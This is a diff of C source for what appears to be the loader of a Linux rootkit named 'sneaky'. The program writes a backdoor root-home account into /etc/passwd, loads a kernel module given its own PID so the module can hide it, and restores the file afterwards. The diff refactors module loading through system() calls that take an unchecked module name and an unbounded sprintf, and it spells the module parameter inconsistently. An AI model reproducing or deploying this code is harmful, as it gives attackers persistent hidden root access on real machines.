@@ -3,6 +3,9 @@
 #include <sys/types.h>
 #include <unistd.h>
 
+#define MAX_CMD_LEN 50
+
+
 void copy_file(char * srcName, char * dstName) {
   size_t sz = 0;
   ssize_t len = 0;
@@ -35,18 +38,37 @@ void add_passwd(char * fileName, char * passwd) {
   fclose(file);
 }
 
-void start_sneaky(){
-  char arg[50];
-  sprintf(arg, "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
+void start_sneaky2(char * module_name){
+  char command[MAX_CMD_LEN];
+  sprintf(command, "insmod %s sneaky_pid=%d", module_name ,getpid());
   printf("\n");
-  system(arg);
-}
+  system(command);
+} 
+
+
 
 void end_sneaky(){
   system("rmmod sneaky_mod.ko");
   copy_file("/tmp/passwd", "/etc/passwd");
   system("rm /tmp/passwd"); 
 }
+
+void exec_cmd(char* cmd, int cmd_len){
+  if(cmd_len >= MAX_CMD_LEN){
+    printf("File copying directory has filled the buffer\n");
+    exit(EXIT_FAILURE);
+  }
+  else{
+    system(cmd);
+  }
+}
+
+void load_sneaky_process(char * module_name){
+  char cmd_buffer[MAX_CMD_LEN];
+  int cmd_len = snprintf(cmd_buffer, MAX_CMD_LEN, "insmod %s sneaky_PID=%d", module_name, getpid());
+  exec_cmd(cmd_buffer, cmd_len);
+}
+
 
 int main() {
   printf("sneaky_process pid = %d\n", getpid());
@@ -57,7 +79,7 @@ int main() {
   add_passwd("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
   
   // Start sneaky process right now
-  start_sneaky();
+  start_sneaky2("sneaky_mod.ko");
   
   // Waiting for the terminated command
   char c = 's';
